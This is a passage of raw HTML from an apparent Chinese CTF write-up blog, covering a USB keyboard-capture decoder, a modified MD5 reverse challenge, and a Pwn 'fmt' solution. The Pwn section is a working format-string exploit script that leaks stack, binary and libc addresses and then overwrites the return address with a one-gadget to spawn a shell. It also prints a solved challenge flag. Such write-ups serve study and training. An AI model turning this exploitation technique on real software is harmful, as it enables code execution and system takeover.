class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>             <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>, <span class="hljs-string">&quot;43&quot;</span>: <span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>, <span class="hljs-string">&quot;44&quot;</span>: <span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>, <span class="hljs-string">&quot;45&quot;</span>: <span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br>output = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>) <span class="hljs-comment">#è¿™é‡Œæ˜¯åŠ å·å†’å·çš„æ•°æ®</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> (line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">and</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;2&#x27;</span>) <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]==<span class="hljs-string">&quot;00&quot;</span>:<br>             <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>] <span class="hljs-keyword">in</span> normalKeys.keys():<br>            output += [[normalKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]],[shiftKeys[line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>]]]][line[<span class="hljs-number">1</span>]==<span class="hljs-string">&#x27;2&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            output += [<span class="hljs-string">&#x27;[unknown]&#x27;</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>keys.close()<br> <br>flag=<span class="hljs-number">0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(output))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        a=output.index(<span class="hljs-string">&#x27;&lt;DEL&gt;&#x27;</span>)<br>        <span class="hljs-keyword">del</span> output[a]<br>        <span class="hljs-keyword">del</span> output[a-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(output)):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> output[i]==<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>:<br>            flag+=<span class="hljs-number">1</span><br>            output.pop(i)<br>            <span class="hljs-keyword">if</span> flag==<span class="hljs-number">2</span>:<br>                flag=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> flag!=<span class="hljs-number">0</span>:<br>            output[i]=output[i].upper()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;output :&#x27;</span> + <span class="hljs-string">&quot;&quot;</span>.join(output))<br></code></pre></td></tr></table></figure><p><img src="/mdimg/2023hwsummer/3.png"><br>èµ›åšå¨å­ç›´æ¥æ¢­<br><img src="/mdimg/2023hwsummer/4.png"><br><code>flag&#123;ec1b8b96-56a9-f15c-4e39-503e92ab45d2&#125;</code></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">from mypwn <span class="hljs-keyword">import</span> *</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">sla</span><span class="hljs-params">(b<span class="hljs-string">&quot;I need a str: &quot;</span>,<span class="hljs-string">&#x27;EXIT\r%18$p%19$p%21$p&#x27;</span>)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">&#x27;0x&#x27;</span>)</span></span><br><span class="hljs-function">ret_addr </span>= <span class="hljs-built_in">leak</span>() - <span class="hljs-number">8</span><br><span class="hljs-built_in">logs</span>(ret_addr)<br><span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>elf.address = <span class="hljs-built_in">leak</span>() - <span class="hljs-number">28</span> - <span class="hljs-number">0x13c6</span><br><span class="hljs-built_in">logs</span>(elf.address)<br><span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc.address = <span class="hljs-built_in">leak</span>() - <span class="hljs-number">243</span> - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br><span class="hljs-built_in">logs</span>(libc.address)<br><br>one = libc.address + <span class="hljs-number">0xe3b01</span><br><br>payload = b<span class="hljs-number">&#x27;</span>%<span class="hljs-number">8</span>c%<span class="hljs-number">8</span>$hhnAAAAAAA<span class="hljs-number">&#x27;</span> + <span class="hljs-built_in">p64</span>(ret_addr)<br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&quot;I need other str: &quot;</span>,payload)<br><br>ret_addr += <span class="hljs-number">16</span><br>one1 = one &amp; <span class="hljs-number">0xffff</span><br>one2 = (one&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span><br><span class="hljs-meta">#dbg()</span><br>payload = b<span class="hljs-number">&#x27;</span>EXIT\r%<span class="hljs-string">&#x27; + str(one1-5).encode() + b&#x27;</span>c%<span class="hljs-number">9</span>$hn<span class="hljs-number">&#x27;</span><br>payload = payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0x18</span>,b<span class="hljs-number">&#x27;</span>A<span class="hljs-number">&#x27;</span>)<br>payload += <span class="hljs-built_in">p64</span>(ret_addr)<br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&quot;I need a str: &quot;</span>,payload)<br>payload = b<span class="hljs-number">&#x27;</span>%<span class="hljs-string">&#x27; + str(one2).encode() + b&#x27;</span>c%<span class="hljs-number">9</span>$hn<span class="hljs-number">&#x27;</span><br>payload = payload.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0x18</span>,b<span class="hljs-number">&#x27;</span>A<span class="hljs-number">&#x27;</span>)<br>payload += <span class="hljs-built_in">p64</span>(ret_addr + <span class="hljs-number">2</span>)<br><span class="hljs-built_in">sla</span>(b<span class="hljs-string">&quot;I need other str: &quot;</span>,payload)<br><br><span class="hljs-built_in">shell</span>()<br></code></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Animals"><a href="#Animals" class="headerlink" title="Animals"></a>Animals</h3><p>ç¨‹åºåŠ äº†å¾ˆå¤šèŠ±æŒ‡ä»¤ï¼Œä½¿ç”¨idapythonè¿›è¡Œå»èŠ±ã€‚<br>ä¿®å¤å®Œæˆåæ‰€æœ‰ç¨‹åºçˆ†çº¢ï¼Œåœ¨è¿™é‡Œæ›´æ”¹æˆå…¨éƒ¨éƒ½æ˜¯ä¸»å‡½æ•°èŒƒå›´å†…ï¼Œå¹¶è®°å½•ç»“æŸåœ°å€ï¼š<code>406DA8</code><br>å‘ç°MD5å‡½æ•°ï¼Œè·Ÿè¿›å»å‘ç°è¿™é‡ŒMD5çš„ç è¡¨è¢«è½¬æ¢äº†ï¼Œ1å’Œ2äº¤æ¢ï¼Œ3å’Œ4äº¤æ¢ï¼Œæ‰€ä»¥ï¼Œæ”¹å†™md5.cæ–‡ä»¶ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;memory.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;md5.h&quot;</span></span><br> <br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> PADDING[]=&#123;<span class="hljs-number">0x80</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>                         <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>                         <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>                         <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br>                         <br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MD5Init</span><span class="hljs-params">(MD5_CTX *context)</span></span><br><span class="hljs-function"></span>&#123;<br>     context-&gt;count[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>     context-&gt;count[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>     context-&gt;state[<span class="hljs-number">0</span>] = <span class="hljs-number">0xEFCDAB89</span>;<br>     context-&gt;state[<span class="hljs-number">1</span>] = <span class="hljs-number">0x67452301</span>;<br>     context-&gt;state[<span class="hljs-number">2</span>] = <span class="hljs-number">0x10325476</span>;<br>     context-&gt;state[<span class="hljs-number">3</span>] = <span class="hljs-number">0x98BADCFE</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MD5Update</span><span class="hljs-params">(MD5_CTX *context,<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *input,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> inputlen)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>,index = <span class="hljs-number">0</span>,partlen = <span class="hljs-number">0</span>;<br>    index = (context-&gt;count[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0x3F</span>;<br>    partlen = <span class="hljs-number">64</span> - index;<br>    context-&gt;count[<span class="hljs-number">0</span>] += inputlen &lt;&lt; <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">if</span>(context-&gt;count[<span class="hljs-number">0</span>] &lt; (inputlen &lt;&lt; <span class="hljs-number">3</span>))<br>       context-&gt;count[<span class="hljs-number">1</span>]++;<br>    context-&gt;count[<span class="hljs-number">1</span>] += inputlen &gt;&gt; <span class="hljs-number">29</span>;<br>    <br>    <span class="hljs-keyword">if</span>(inputlen &gt;= partlen)<br>    &#123;<br>       <span class="hljs-built_in">memcpy</span>(&amp;context-&gt;buffer[index],input,partlen);<br>       <span class="hljs-built_in">MD5Transform</span>(context-&gt;state,context-&gt;buffer);<br>       <span class="hljs-keyword">for</span>(i = partlen;i+<span class="hljs-number">64</span> &lt;= inputlen;i+=<span class="hljs-number">64</span>)<br>           <span class="hljs-built_in">MD5Transform</span>(context-&gt;state,&amp;input[i]);<br>       index = <span class="hljs-number">0</span>;        <br>    &#125;  <br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        i = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-built_in">memcpy</span>(&amp;context-&gt;buffer[index],&amp;input[i],inputlen-i);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MD5Final</span><span class="hljs-params">(MD5_CTX *context,<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> digest[<span class="hljs-number">16</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>,padlen = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> bits[<span class="hljs-number">8</span>];<br>    index = (context-&gt;count[<span class="hljs-number">0</span>] &gt;&gt; <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0x3F</span>;<br>    padlen = (index &lt; <span class="hljs-number">56</span>)?(<span class="hljs-number">56</span>-index):(<span class="hljs-number">120</span>-index);<br>    <span class="hljs-built_in">MD5Encode</span>(bits,context-&gt;count,<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">MD5Update</span>(context,PADDING,padlen);<br>    <span class="hljs-built_in">MD5Update</span>(context,bits,<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">MD5Encode</span>(digest,context-&gt;state,<span class="hljs-number">16</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MD5Encode</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *output,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *input,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>,j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(j &lt; len)<br>    &#123;<br>         output[j] = input[i] &amp; <span class="hljs-number">0xFF</span>;  <br>         output[j+<span class="hljs-number">1</span>] = (input[i] &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>;<br>         output[j+<span class="hljs-number">2</span>] = (input[i] &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>;<br>         output[j+<span class="hljs-number">3</span>] = (input[i] &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFF</span>;<br>         i++;<br>         j+=<span class="hljs-number">4</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MD5Decode</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *output,<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *input,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>,j = <span class="hljs-number">0</span>;<br>     <span class="hljs-keyword">while</span>(j &lt; len)<br>     &#123;<br>           output[i] = (input[j]) |<br>                       (input[j+<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">8</span>) |<br>                       (input[j+<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">16</span>) |<br>                       (input[j+<span class="hljs-number">3</span>] &lt;&lt; <span class="hljs-number">24</span>);<br>           i++;<br>           j+=<span class="hljs-number">4</span>; <br>     &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MD5Transform</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> state[<span class="hljs-number">4</span>],<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> block[<span class="hljs-number">64</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a = state[<span class="hljs-number">0</span>];<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> b = state[<span class="hljs-number">1</span>];<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> c = state[<span class="hljs-number">2</span>];<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> d = state[<span class="hljs-number">3</span>];<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> x[<span class="hljs-number">64</span>];<br>     <span class="hljs-built_in">MD5Decode</span>(x,block,<span class="hljs-number">64</span>);<br>     <span class="hljs-built_in">FF</span>(a, b, c, d, x[ <span class="hljs-number">0</span>], <span class="hljs-number">7</span>, <span class="hljs-number">0xd76aa478</span>); <span class="hljs-comment">/* 1 */</span><br> <span class="hljs-built_in">FF</span>(d, a, b, c, x[ <span class="hljs-number">1</span>], <span class="hljs-number">12</span>, <span class="hljs-number">0xe8c7b756</span>); <span class="hljs-comment">/* 2 */</span><br> <span class="hljs-built_in">FF</span>(c, d, a, b, x[ <span class="hljs-number">2</span>], <span class="hljs-number">17</span>, <span class="hljs-number">0x242070db</span>); <span class="hljs-comment">/* 3 */</span><br> <span class="hljs-built_in">FF</span>(b, c, d, a, x[ <span class="hljs-number">3</span>], <span class="hljs-number">22</span>, <span class="hljs-number">0xc1bdceee</span>); <span class="hljs-comment">/* 4 */</span><br> <span class="hljs-built_in">FF</span>(a, b, c, d, x[ <span class="hljs-number">4</span>], <span class="hljs-number">7</span>, <span class="hljs-number">0xf57c0faf</span>); <span class="hljs-comment">/* 5 */</span><br> <span class="hljs-built_in">FF</span>(d, a, b, c, x[ <span class="hljs-number">5</span>], <span class="hljs-number">12</span>, <span class="hljs-number">0x4787c62a</span>); <span class="hljs-comment">/* 6 */</span><br> <span class="hljs-built_in">FF</span>(c, d, a, b, x[ <span class="hljs-number">6</span>], <span class="hljs-number">17</span>, <span class="hljs-number">0xa8304613</span>); <span class="hljs-comment">/* 7 */</span><br> <span class="hljs-built_in">FF</span>(b, c, d, a, x[ <span class="hljs-number">7</span>], <span class="hljs-number">22</span>, <span class="hljs-number">0xfd469501</span>); <span class="hljs-comment">/* 8 */</span><br> <span class="hljs-built_in">FF</span>(a, b, c, d, x[ <span class="hljs-number">8</span>], <span class="hljs-number">7</span>, <span class="hljs-number">0x698098d8</span>); <span class="hljs-comment">/* 9 */</span><br> <span class="hljs-built_in">FF</span>(d, a, b, c, x[ <span class="hljs-number">9</span>], <span class="hljs-number">12</span>, <span class="hljs-number">0x8b44f7af</span>); <span class="hljs-comment">/* 10 */</span><br> <span class="hljs-built_in">FF</span>(c, d, a, b, x[<span class="hljs-number">10</span>], <span class="hljs-number">17</span>, <span class="hljs-number">0xffff5bb1</span>); <span class="hljs-comment">/* 11 */</span><br> <span class="hljs-built_in">FF</span>(b, c, d, a, x[<span class="hljs-number">11</span>], <span class="hljs-number">22</span>, <span class="hljs-number">0x895cd7be</span>); <span class="hljs-comment">/* 12 */</span><br> <span class="hljs-built_in">FF</span>(a, b, c, d, x[<span class="hljs-number">12</span>], <span class="hljs-number">7</span>, <span class="hljs-number">0x6b901122</span>); <span class="hljs-comment">/* 13 */</span><br> <span class="hljs-built_in">FF</span>(d, a, b, c, x[<span class="hljs-number">13</span>], <span class="hljs-number">12</span>, <span class="hljs-number">0xfd987193</span>); <span class="hljs-comment">/* 14 */</span><br> <span class="hljs-built_in">FF</span>(c, d, a, b, x[<span class="hljs-number">14</span>], <span class="hljs-number">17</span>, <span class="hljs-number">0xa679438e</span>); <span class="hljs-comment">/* 15 */</span><br> <span class="hljs-built_in">FF</span>(b, c, d, a, x[<span class="hljs-number">15</span>], <span class="hljs-number">22</span>, <span class="hljs-number">0x49b40821</span>); <span class="hljs-comment">/* 16 */</span><br> <br> <span class="hljs-comment">/* Round 2 */</span><br> <span class="hljs-built_in">GG</span>(a, b, c, d, x[ <span class="hljs-number">1</span>], <span class="hljs-number">5</span>, <span class="hljs-number">0xf61e2562</span>); <span class="hljs-comment">/* 17 */</span><br> <span class="hljs-built_in">GG</span>(d, a, b, c, x[ <span class="hljs-number">6</span>], <span class="hljs-number">9</span>, <span class="hljs-number">0xc040b340</span>); <span class="hljs-comment">/* 18 */</span><br> <span class="hljs-built_in">GG</span>(c, d, a, b, x[<span class="hljs-number">11</span>], <span class="hljs-number">14</span>, <span class="hljs-number">0x265e5a51</span>); <span class="hljs-comment">/* 19 */</span><br> <span class="hljs-built_in">GG</span>(b, c, d, a, x[ <span class="hljs-number">0</span>], <span class="hljs-number">20</span>, <span class="hljs-number">0xe9b6c7aa</span>); <span class="hljs-comment">/* 20 */</span><br> <span class="hljs-built_in">GG</span>(a, b, c, d, x[ <span class="hljs-number">5</span>], <span class="hljs-number">5</span>, <span class="hljs-number">0xd62f105d</span>); <span class="hljs-comment">/* 21 */</span><br> <span class="hljs-built_in">GG</span>(d, a, b, c, x[<span class="hljs-number">10</span>], <span class="hljs-number">9</span>,  <span class="hljs-number">0x2441453</span>); <span class="hljs-comment">/* 22 */</span><br> <span class="hljs-built_in">GG</span>(c, d, a, b, x[<span class="hljs-number">15</span>], <span class="hljs-number">14</span>, <span class="hljs-number">0xd8a1e681</span>); <span class="hljs-comment">/* 23 */</span><br> <span class="hljs-built_in">GG</span>(b, c, d, a, x[ <span class="hljs-number">4</span>], <span class="hljs-number">20</span>, <span class="hljs-number">0xe7d3fbc8</span>); <span class="hljs-comment">/* 24 */</span><br> <span class="hljs-built_in">GG</span>(a, b, c, d, x[ <span class="hljs-number">9</span>], <span class="hljs-number">5</span>, <span class="hljs-number">0x21e1cde6</span>); <span class="hljs-comment">/* 25 */</span><br> <span class="hljs-built_in">GG</span>(d, a, b, c, x[<span class="hljs-number">14</span>], <span class="hljs-number">9</span>, <span class="hljs-number">0xc33707d6</span>); <span class="hljs-comment">/* 26 */</span><br> <span class="hljs-built_in">GG</span>(c, d, a, b, x[ <span class="hljs-number">3</span>], <span class="hljs-number">14</span>, <span class="hljs-number">0xf4d50d87</span>); <span class="hljs-comment">/* 27 */</span><br> <span class="hljs-built_in">GG</span>(b, c, d, a, x[ <span class="hljs-number">8</span>], <span class="hljs-number">20</span>, <span class="hljs-number">0x455a14ed</span>); <span class="hljs-comment">/* 28 */</span><br> <span class="hljs-built_in">GG</span>(a, b, c, d, x[<span class="hljs-number">13</span>], <span class="hljs-number">5</span>, <span class="hljs-number">0xa9e3e905</span>); <span class="hljs-comment">/* 29 */</span><br> <span class="hljs-built_in">GG</span>(d, a, b, c, x[ <span class="hljs-number">2</span>], <span class="hljs-number">9</span>, <span class="hljs-number">0xfcefa3f8</span>); <span class="hljs-comment">/* 30 */</span><br> <span class="hljs-built_in">GG</span>(c, d, a, b, x[ <span class="hljs-number">7</span>], <span class="hljs-number">14</span>, <span class="hljs-number">0x676f02d9</span>); <span class="hljs-comment">/* 31 */</span><br> <span class="hljs-built_in">GG</span>(b, c, d, a, x[<span class="hljs-number">12</span>], <span class="hljs-number">20</span>, <span class="hljs-number">0x8d2a4c8a</span>); <span class="hljs-comment">/* 32 */</span><br> <br> <span class="hljs-comment">/* Round 3 */</span><br> <span 